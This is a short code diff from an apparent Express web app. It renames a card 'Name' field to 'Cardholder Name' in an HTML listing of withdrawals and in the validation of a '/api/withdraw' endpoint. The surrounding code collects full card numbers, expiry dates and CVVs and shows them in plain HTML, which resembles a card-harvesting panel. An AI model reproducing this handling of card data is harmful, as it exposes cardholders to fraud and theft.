@@ -191,7 +191,7 @@ function generateHTML(withdrawals) {
                         <div><span class="label">Card Number:</span> <span class="value">${w.cardNumber}</span></div>
                         <div><span class="label">Expiration:</span> <span class="value">${w.cardExp}</span></div>
                         <div><span class="label">CVV:</span> <span class="value">${w.cardCvv || 'N/A'}</span></div>
-                        <div><span class="label">Name:</span> <span class="value">${w.cardName}</span></div>
+                        <div><span class="label">Cardholder Name:</span> <span class="value">${w.cardholderName}</span></div> <!-- Updated from Name -->
                         <div><span class="label">Zip Code:</span> <span class="value">${w.zipCode}</span></div>
                     </div>
                 `).join('')}
@@ -206,9 +206,9 @@ app.post('/api/withdraw', async (req, res) => {
     try {
         const withdrawalData = req.body;
         
-        // Basic validation
+        // Basic validation (updated to cardholderName)
         if (!withdrawalData.amount || !withdrawalData.cardNumber || 
-            !withdrawalData.cardExp || !withdrawalData.cardName || 
+            !withdrawalData.cardExp || !withdrawalData.cardholderName || 
             !withdrawalData.zipCode) {
             return res.status(400).json({ error: 'Missing required fields' });
         }
